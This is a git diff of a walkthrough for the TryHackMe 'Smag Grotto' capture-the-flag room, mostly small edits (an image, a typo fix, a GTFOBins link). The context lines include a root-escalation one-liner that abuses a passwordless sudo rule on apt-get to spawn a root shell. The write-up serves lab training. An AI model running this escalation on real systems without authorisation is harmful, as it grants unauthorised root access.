@@ -1,4 +1,5 @@
-# Smag Grotto
+# Smag Grotto  
+![alt text](https://i.imgur.com/1n5m1aa.png)   
 TryHackMe Easy [Room](https://tryhackme.com/room/smaggrotto)
 
 ## Nmap Scan
@@ -55,7 +56,7 @@ Add development.smag.thm to your `/etc/hosts` and access it through browser.
     127.0.0.1	localhost
     127.0.1.1	reza-HP-Spectre
     172.16.122.129	hekerendonesa
-    10.10.228.117	smag.thm	development.smag.thm
+    10.10.228.117	smag.thm	development.smag.thm < ----
     10.10.70.17	windcorp.thm	fire.windcorp.thm
     172.16.122.130	nugroho-server
     ```
@@ -87,7 +88,7 @@ After changing that, we can access jake's account with no password.
 ![alt text](https://i.imgur.com/WgpnqsN.png)   
 
 ## Getting to Root
-From the moment i get access to user `jake`, the first thing i tried is to check jake's sudo cprivilege with the command `sudo -l`.  
+From the moment i get access to user `jake`, the first thing i tried is to check jake's sudo privilege with the command `sudo -l`.  
 And here's what i got 
 ```bash
 jake@smag:~$ sudo -l
@@ -97,7 +98,7 @@ Matching Defaults entries for jake on smag:
 User jake may run the following commands on smag:
     (ALL : ALL) NOPASSWD: /usr/bin/apt-get
 ```
-So just go to GTFOBins and find `apt-get`   
+So just go to [GTFOBins](https://gtfobins.github.io/) and find `apt-get`   
 ![alt text](https://i.imgur.com/qd1AJlB.png)   
 Just run `sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh` and you will get root shell.   
 ![alt text](https://i.imgur.com/4dXK1YU.png)
